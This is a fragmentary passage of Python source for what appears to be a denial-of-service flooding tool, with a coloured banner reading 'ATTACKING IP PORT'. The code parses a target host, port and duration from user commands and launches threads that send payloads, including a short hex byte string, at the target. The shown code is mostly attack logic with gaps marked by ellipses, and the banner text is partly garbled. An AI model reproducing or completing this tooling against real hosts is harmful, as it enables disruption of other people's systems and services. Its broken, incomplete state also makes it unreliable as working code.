...
\033[31m╦═══════════════════════════════════════════════╦
               ...
               \033[34m╚╩╝╩╚═╝╚═╝\033[33m ╚╝ ╩╩  
\033[31m╩═══════════════════════════════════════════════╩
\033[34m║ \033[34mATTACKING IP PORT KENDOSS DECK?, ACEE     ║ 
╩═══════════════════════════════════════════════╩
"""
pen = """
\033[34m ============================
		  ...
		  exit()
			...
			try:
				if running >= 1:
					...
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b''
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system("cls")
					print(attacked)
					time.sleep(35)
			...
			try:
				if running >= 1:
					...
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = "\x30\x30\x30\x30\x34\x30\x30\x30"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(35)
